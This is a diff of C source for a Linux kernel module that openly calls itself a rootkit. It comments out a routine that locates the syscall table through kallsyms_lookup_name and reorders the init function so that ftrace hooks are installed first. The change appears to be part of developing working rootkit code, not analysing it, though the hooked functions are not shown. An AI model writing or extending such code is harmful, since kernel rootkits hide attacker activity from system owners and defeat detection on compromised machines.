@@ -460,22 +460,22 @@ static void protect_memory(void){
     printk(KERN_INFO "protected memory\n");
 }
 
-/**
- * checks kernel version and gets address of syscall table
- * @return - returns the memory adress of the syscall table
-*/
-static unsigned long *get_syscall_table(void){
-    unsigned long *syscall_table;
+// /**
+//  * checks kernel version and gets address of syscall table
+//  * @return - returns the memory adress of the syscall table
+// */
+// static unsigned long *get_syscall_table(void){
+//     unsigned long *syscall_table;
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(6,0,0)
-        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
-#else
-        syscall_table = NULL;
-#endif
+// #if LINUX_VERSION_CODE < KERNEL_VERSION(6,0,0)
+//         syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+// #else
+//         syscall_table = NULL;
+// #endif
 
-	//printk(KERN_INFO "syscaltable value: %ln",syscall_table);
-    return syscall_table;
-}
+// 	//printk(KERN_INFO "syscaltable value: %ln",syscall_table);
+//     return syscall_table;
+// }
 
 /**
  * array of functins hooked by this rootkit
@@ -492,18 +492,21 @@ static struct ftrace_hook hooks[] = {
  * like the main method
 */
 static int __init init_func(void){
-    int err = 1;
-    printk(KERN_INFO "rootkit: initalized\n");
-
+    int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 
-
-    __sys_call_table = get_syscall_table();
-
-    if(!__sys_call_table){
-        printk(KERN_INFO "error: unable to gain syscal table\n");
+    if(err){
         return err;
     }
+    
+    printk(KERN_INFO "rootkit: initalized\n");
+
+    //__sys_call_table = get_syscall_table();
+
+    // if(!__sys_call_table){
+    //     printk(KERN_INFO "error: unable to gain syscal table\n");
+    //     return err;
+    // }
 
     // if(store() == err){
     //     printk(KERN_INFO "error:store error\n");
